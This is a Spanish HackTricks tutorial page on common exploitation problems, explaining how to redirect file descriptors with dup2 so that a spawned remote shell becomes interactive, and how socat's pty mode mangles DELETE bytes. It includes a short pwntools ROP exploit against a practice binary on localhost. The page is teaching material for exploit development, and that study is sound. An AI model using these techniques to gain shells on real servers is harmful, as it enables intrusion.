# Problemas Comunes de Explotaci칩n

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* 쯊rabajas en una **empresa de ciberseguridad**? 쯈uieres ver tu **empresa anunciada en HackTricks**? 쯆 quieres tener acceso a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF**? 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **칔nete al** [**游눫**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## FDs en Explotaci칩n Remota

Al enviar un exploit a un servidor remoto que llama a **`system('/bin/sh')`** por ejemplo, esto se ejecutar치 en el proceso del servidor, y `/bin/sh` esperar치 entrada desde stdin (FD: `0`) e imprimir치 la salida en stdout y stderr (FDs `1` y `2`). Por lo tanto, el atacante no podr치 interactuar con la shell.

Una forma de solucionar esto es suponer que cuando el servidor se inici칩, cre칩 el **n칰mero de FD `3`** (para escuchar) y que luego, tu conexi칩n estar치 en el **n칰mero de FD `4`**. Por lo tanto, es posible utilizar la llamada al sistema **`dup2`** para duplicar el stdin (FD 0) y el stdout (FD 1) en el FD 4 (el de la conexi칩n del atacante) para que sea posible contactar con la shell una vez que se ejecute.

[**Ejemplo de exploit desde aqu칤**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Tenga en cuenta que socat ya transfiere `stdin` y `stdout` al socket. Sin embargo, el modo `pty` **incluye caracteres DELETE**. Por lo tanto, si env칤a un `\x7f` (`DELETE`), **borrar치 el car치cter anterior** de su exploit.

Para evitar esto, el **car치cter de escape `\x16` debe ser antepuesto a cualquier `\x7f` enviado.**

**Aqu칤 puedes** [**encontrar un ejemplo de este comportamiento**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* 쯊rabajas en una **empresa de ciberseguridad**? 쯈uieres ver tu **empresa anunciada en HackTricks**? 쯆 quieres tener acceso a la **칰ltima versi칩n del PEASS o descargar HackTricks en PDF**? 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **칔nete al** [**游눫**](https://emojipedia.org/speech-balloon/) **grupo de Discord**](https://discord.gg/hRep4RUj7f) o al **grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
